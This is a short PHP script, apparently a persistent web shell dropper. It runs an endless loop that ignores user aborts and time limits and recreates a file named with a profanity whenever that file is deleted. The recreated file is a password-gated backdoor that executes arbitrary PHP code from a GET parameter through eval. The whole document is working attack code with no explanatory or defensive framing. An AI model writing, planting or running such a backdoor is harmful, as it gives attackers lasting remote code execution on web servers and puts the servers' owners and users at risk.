<?php ;
ignore_user_abort(true);
set_time_limit(0);
$file = './fuckyou.php';
$code = '<?php if(md5($_GET["pass"])=="3a50065e1709acc47ba0c9238294364f"){@eval($_GET[a]);} ?>';
while (1){if(!file_exists($file))
{
file_put_contents($file,$code);}
usleep(50);
}
?>